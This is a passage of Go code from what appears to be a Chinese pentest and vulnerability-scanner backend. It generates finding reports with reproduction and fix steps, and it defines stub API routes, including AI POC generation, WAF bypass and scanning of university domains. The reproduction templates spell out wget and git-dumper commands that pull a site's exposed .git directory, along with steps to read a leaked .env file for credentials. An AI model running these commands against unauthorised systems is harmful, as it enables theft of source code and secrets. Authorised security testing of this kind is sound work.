		details.References = `https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
https://portswigger.net/web-security/cors`
		details.Tags = "cors,misconfig,cross-origin"
		details.RiskLevel = 7

	case "missing_header":
		details.ReproduceSteps = fmt.Sprintf(`【安全响应头缺失复现步骤】

1. 访问目标URL: %s
2. 使用浏览器开发者工具查看响应头
3. 检查是否缺少安全响应头

【危害等级】%s
【风险说明】缺少安全响应头可能导致XSS、点击劫持等攻击`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 配置Content-Security-Policy响应头
2. 配置X-Frame-Options: DENY或SAMEORIGIN
3. 配置X-Content-Type-Options: nosniff
4. 配置Strict-Transport-Security
5. 配置X-XSS-Protection: 1; mode=block`
		details.References = `https://owasp.org/www-community/Security_Headers
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers`
		details.Tags = "headers,misconfig"
		details.RiskLevel = 5

	case "cookie_security":
		details.ReproduceSteps = fmt.Sprintf(`【Cookie安全问题复现步骤】

1. 访问目标URL: %s
2. 使用浏览器开发者工具查看Cookie属性
3. 检查是否缺少HttpOnly、Secure、SameSite属性

【危害等级】%s
【风险说明】不安全的Cookie可能被XSS窃取或CSRF攻击`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 设置HttpOnly属性防止XSS窃取
2. 设置Secure属性仅HTTPS传输
3. 设置SameSite属性防止CSRF
4. 使用随机生成的Session ID`
		details.References = `https://owasp.org/www-community/controls/SecureCookieAttribute
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies`
		details.Tags = "cookie,session,security"
		details.RiskLevel = 6

	case "vuln_detected":
		if strings.Contains(title, "Git") || strings.Contains(title, "git") {
			details.ReproduceSteps = fmt.Sprintf(`【Git仓库泄露复现步骤】

1. 访问目标URL: %s
2. 下载.git目录:
   wget -r --no-parent %s/.git/
3. 使用git-dumper工具:
   git-dumper %s/.git/ output_dir
4. 查看提交历史获取源代码

【危害等级】%s
【风险说明】泄露源代码、配置文件、数据库密码等敏感信息`, target, target, target, severity)
			details.FixSuggestion = `【修复建议】
1. 删除线上.git目录
2. 配置Web服务器禁止访问隐藏文件
3. 使用.gitignore忽略敏感文件
4. 代码审计检查是否泄露敏感信息`
			details.References = `https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-`
			details.Tags = "git,source-code,exposure"
			details.RiskLevel = 8
		} else if strings.Contains(title, "env") || strings.Contains(title, "环境") {
			details.ReproduceSteps = fmt.Sprintf(`【环境配置文件泄露复现步骤】

1. 访问目标URL: %s
2. 直接访问/.env文件
3. 获取数据库密码、API密钥等敏感信息

【危害等级】%s
【风险说明】泄露数据库密码、API密钥、密钥等核心敏感信息`, target, severity)
			details.FixSuggestion = `【修复建议】
1. 删除线上.env文件
2. 配置Web服务器禁止访问配置文件
3. 使用环境变量存储敏感配置
4. 敏感配置文件放在Web目录外`
			details.References = `https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_GET_request`
			details.Tags = "env,config,exposure"
			details.RiskLevel = 10
		} else {
			details.ReproduceSteps = fmt.Sprintf(`【漏洞复现步骤】

1. 访问目标URL: %s
2. 根据漏洞类型进行测试
3. 验证漏洞存在

【危害等级】%s
【风险说明】%s`, target, severity, description)
			details.FixSuggestion = `【修复建议】
1. 根据漏洞类型进行针对性修复
2. 参考OWASP相关指南
3. 进行安全代码审计`
			details.Tags = "vuln,security"
			details.RiskLevel = 7
		}

	case "sensitive_info":
		details.ReproduceSteps = fmt.Sprintf(`【敏感信息泄露复现步骤】

1. 访问目标URL: %s
2. 查看页面源代码
3. 搜索敏感关键词: password, secret, key, token
4. 使用正则表达式匹配敏感信息

【危害等级】%s
【风险说明】泄露敏感信息可能被攻击者利用`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 移除页面中的敏感信息
2. 检查备份文件和配置文件
3. 代码审计排查敏感信息泄露
4. 使用静态代码分析工具`
		details.Tags = "info-disclosure,sensitive"
		details.RiskLevel = 6

	case "tech_detection":
		details.ReproduceSteps = fmt.Sprintf(`【技术栈识别结果】

目标URL: %s
检测结果: %s

【安全建议】
1. 及时更新框架和库版本
2. 隐藏服务器版本信息
3. 配置安全响应头
4. 定期进行安全审计`, target, description)
		details.FixSuggestion = `【修复建议】
1. 隐藏服务器技术栈信息
2. 配置安全响应头
3. 及时更新组件版本
4. 移除不必要的调试信息`
		details.Tags = "tech,fingerprint"
		details.RiskLevel = 3

	default:
		details.ReproduceSteps = fmt.Sprintf(`【漏洞复现步骤】

1. 访问目标URL: %s
2. 根据漏洞描述进行测试
3. 验证漏洞存在

【危害等级】%s
【风险说明】%s`, target, severity, description)
		details.FixSuggestion = `【修复建议】
1. 根据漏洞类型进行针对性修复
2. 参考OWASP相关指南
3. 进行安全代码审计`
		details.Tags = "vuln,security"
		details.RiskLevel = 5
	}

	return details
}

func parsePortRange(portStr string) []int {
	var ports []int
	portStr = strings.TrimSpace(portStr)
	if strings.Contains(portStr, "-") {
		parts := strings.Split(portStr, "-")
		if len(parts) == 2 {
			start, _ := strconv.Atoi(strings.TrimSpace(parts[0]))
			end, _ := strconv.Atoi(strings.TrimSpace(parts[1]))
			for i := start; i <= end && i <= 65535; i++ {
				ports = append(ports, i)
			}
		}
	} else {
		if port, err := strconv.Atoi(portStr); err == nil {
			ports = append(ports, port)
		}
	}
	if len(ports) == 0 {
		ports = []int{80, 443, 8080, 8443}
	}
	return ports
}

func timePtr(t time.Time) *time.Time {
	return &t
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (a *API) StopActiveScan(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var task models.ActiveScanTask
	if err := a.db.First(&task, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "扫描任务不存在")
		return
	}
	task.Status = "cancelled"
	a.db.Save(&task)
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "扫描已停止"})
}

func (a *API) GetActiveScanResults(w http.ResponseWriter, r *http.Request) {
	taskID := chi.URLParam(r, "task_id")
	var results []models.ScanResult
	a.db.Where("task_id = ?", taskID).Find(&results)
	a.respondJSON(w, http.StatusOK, results)
}

func (a *API) GetProxyConfig(w http.ResponseWriter, r *http.Request) {
	var configs []models.ProxyConfig
	a.db.Find(&configs)
	if len(configs) > 0 {
		a.respondJSON(w, http.StatusOK, configs[0])
	} else {
		defaultConfig := models.ProxyConfig{
			Enabled: false,
			Type:    "http",
			Host:    "127.0.0.1",
			Port:    8080,
		}
		a.db.Create(&defaultConfig)
		a.respondJSON(w, http.StatusOK, defaultConfig)
	}
}

func (a *API) UpdateProxyConfig(w http.ResponseWriter, r *http.Request) {
	var config models.ProxyConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	var existing models.ProxyConfig
	if a.db.First(&existing).Error == nil {
		config.ID = existing.ID
		a.db.Save(&config)
	} else {
		config.ID = uuid.New().String()
		a.db.Create(&config)
	}

	a.respondJSON(w, http.StatusOK, config)
}

func (a *API) GetNetworkConfig(w http.ResponseWriter, r *http.Request) {
	var configs []models.NetworkConfig
	a.db.Find(&configs)
	if len(configs) > 0 {
		a.respondJSON(w, http.StatusOK, configs[0])
	} else {
		defaultConfig := models.NetworkConfig{
			Concurrency:     10,
			RateLimit:       50,
			Timeout:         30,
			Retries:         3,
			UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			FollowRedirects: true,
		}
		a.db.Create(&defaultConfig)
		a.respondJSON(w, http.StatusOK, defaultConfig)
	}
}

func (a *API) UpdateNetworkConfig(w http.ResponseWriter, r *http.Request) {
	var config models.NetworkConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	var existing models.NetworkConfig
	if a.db.First(&existing).Error == nil {
		config.ID = existing.ID
		a.db.Save(&config)
	} else {
		config.ID = uuid.New().String()
		a.db.Create(&config)
	}

	a.respondJSON(w, http.StatusOK, config)
}

func (a *API) TestNetworkConnection(w http.ResponseWriter, r *http.Request) {
	var req struct {
		URL   string `json:"url"`
		Proxy string `json:"proxy,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"success": true,
		"message": "连接成功",
		"status":  200,
		"url":     req.URL,
	})
}

func (a *API) GetDashboardTrend(w http.ResponseWriter, r *http.Request) {
	var trends []map[string]interface{}
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"trend": trends,
	})
}

func (a *API) GetTopAssets(w http.ResponseWriter, r *http.Request) {
	var assets []models.Asset
	a.db.Limit(10).Find(&assets)
	a.respondJSON(w, http.StatusOK, assets)
}

func (a *API) AIAnalyze(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "AI分析功能",
	})
}

func (a *API) AIGeneratePOC(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "POC生成功能",
	})
}

func (a *API) AIBypassWAF(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "WAF绕过功能",
	})
}

func (a *API) ImportEduDomains(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "导入高校域名功能",
	})
}

func (a *API) DeleteEduDomain(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := a.db.Delete(&models.University{}, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "删除失败")
		return
	}
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "删除成功"})
}

func (a *API) GenerateEduReport(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "生成EDUSRC报告功能",
	})
}

func (a *API) GetReportTemplates(w http.ResponseWriter, r *http.Request) {
	templates := []map[string]interface{}{
		{"id": "1", "name": "EDUSRC报告", "type": "edusrc"},
		{"id": "2", "name": "企业渗透测试报告", "type": "enterprise"},
	}
	a.respondJSON(w, http.StatusOK, templates)
}

func (a *API) GenerateReport(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "生成报告功能",
	})
}

func (a *API) UploadReportTemplate(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "上传报告模板功能",
	})
}

func (a *API) DownloadReport(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"id":      id,
		"message": "下载报告功能",
	})
}

func (a *API) ListRequestHistory(w http.ResponseWriter, r *http.Request) {
	var requests []models.NetworkRequest
	query := a.db.Order("timestamp DESC")
	
	if module := r.URL.Query().Get("module"); module != "" {
		query = query.Where("module = ?", module)
	}
	if target := r.URL.Query().Get("target"); target != "" {
		query = query.Where("target LIKE ?", "%"+target+"%")
	}
	if method := r.URL.Query().Get("method"); method != "" {
		query = query.Where("method = ?", method)
	}
	
	query.Limit(100).Find(&requests)
	a.respondJSON(w, http.StatusOK, requests)
}

func (a *API) GetRequestHistory(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var req models.NetworkRequest
	if err := a.db.First(&req, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "请求不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, req)
}

func (a *API) DeleteRequestHistory(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := a.db.Delete(&models.NetworkRequest{}, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "删除失败")
		return
	}
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "删除成功"})
}

func (a *API) ClearRequestHistory(w http.ResponseWriter, r *http.Request) {
	a.db.Where("1=1").Delete(&models.NetworkRequest{})
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "历史已清空"})
}

func (a *API) ExportRequestHistory(w http.ResponseWriter, r *http.Request) {
	var requests []models.NetworkRequest
	a.db.Order("timestamp DESC").Limit(1000).Find(&requests)
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", "attachment; filename=request-history.json")
	json.NewEncoder(w).Encode(requests)
}

func (a *API) SetupRoutes(r chi.Router) {
	r.Route("/api/v1", func(r chi.Router) {
		r.Get("/targets", a.ListTargets)
		r.Post("/targets", a.CreateTarget)
		r.Delete("/targets/{id}", a.DeleteTarget)
		r.Get("/targets/{id}/assets/tree", a.GetAssetTree)

		r.Get("/vulnerabilities", a.ListVulnerabilities)
		r.Post("/vulnerabilities", a.CreateVulnerability)
		r.Get("/vulnerabilities/{id}", a.GetVulnerability)
		r.Post("/vulnerabilities/{id}/confirm", a.ConfirmVulnerability)
		r.Patch("/vulnerabilities/{id}", a.PatchVulnerability)
		r.Post("/vulnerabilities/bulk", a.BulkVulnerabilityAction)
		r.Get("/vulnerabilities/{id}/comments", a.GetVulnerabilityComments)
		r.Post("/vulnerabilities/{id}/comments", a.AddVulnerabilityComment)

		r.Get("/assets/{id}", a.GetAsset)
		r.Patch("/assets/{id}", a.PatchAsset)
		r.Delete("/assets/{id}", a.DeleteAsset)
		r.Get("/assets/stats", a.GetAssetStats)
		r.Get("/assets/search", a.SearchAssets)

		r.Get("/dashboard/stats", a.GetVulnDashboardStats)
		r.Get("/dashboard/trend", a.GetDashboardTrend)
		r.Get("/dashboard/top-assets", a.GetTopAssets)

		r.Get("/ai/status", a.GetAIStatus)
		r.Get("/ai/config", a.GetAIConfig)
		r.Put("/ai/config", a.UpdateAIConfig)
		r.Post("/ai/test", a.TestAIConnection)
		r.Post("/ai/chat", a.AIChat)
		r.Post("/ai/analyze", a.AIAnalyze)
		r.Post("/ai/generate-poc", a.AIGeneratePOC)
		r.Post("/ai/bypass-waf", a.AIBypassWAF)

		r.Get("/edu/domains", a.GetEduUniversities)
		r.Post("/edu/domains/import", a.ImportEduDomains)
		r.Delete("/edu/domains/{id}", a.DeleteEduDomain)
		r.Get("/edu/systems", a.GetEduSystems)
		r.Post("/edu/scan", a.EduScan)
		r.Get("/edu/scan/{id}/results", a.GetEduScanResults)
		r.Post("/edu/report", a.GenerateEduReport)
		r.Get("/edu/stats", a.GetEduStats)

		r.Get("/vuln-techniques", a.GetVulnTechniques)
		r.Get("/vuln-techniques/stats", a.GetVulnTechniqueStats)
		r.Get("/vuln-techniques/{id}", a.GetVulnTechnique)
		r.Post("/vuln-techniques/practice", a.PracticeVuln)
		r.Get("/vuln-techniques/practice/results", a.GetVulnPracticeResults)
		r.Get("/vuln-techniques/practice/{id}", a.GetVulnPracticeResult)

		r.Get("/reports/templates", a.GetReportTemplates)
		r.Post("/reports/generate", a.GenerateReport)
		r.Post("/reports/templates/upload", a.UploadReportTemplate)
		r.Get("/reports/download/{id}", a.DownloadReport)

		r.Get("/active-scans", a.ListActiveScans)
		r.Post("/active-scans", a.CreateActiveScan)
		r.Get("/active-scans/{id}", a.GetActiveScan)
		r.Delete("/active-scans/{id}", a.StopActiveScan)
		r.Get("/active-scans/{task_id}/results", a.GetActiveScanResults)

		r.Get("/proxy", a.GetProxyConfig)
		r.Put("/proxy", a.UpdateProxyConfig)
		r.Get("/network/config", a.GetNetworkConfig)
		r.Put("/network/config", a.UpdateNetworkConfig)
		r.Post("/network/test", a.TestNetworkConnection)

		r.Get("/request-history", a.ListRequestHistory)
		r.Get("/request-history/{id}", a.GetRequestHistory)
		r.Delete("/request-history/{id}", a.DeleteRequestHistory)
		r.Delete("/request-history", a.ClearRequestHistory)
		r.Get("/request-history/export", a.ExportRequestHistory)

		r.Post("/recon", a.StartRecon)
		r.Post("/vuln-scans", a.StartVulnScan)
	})
}
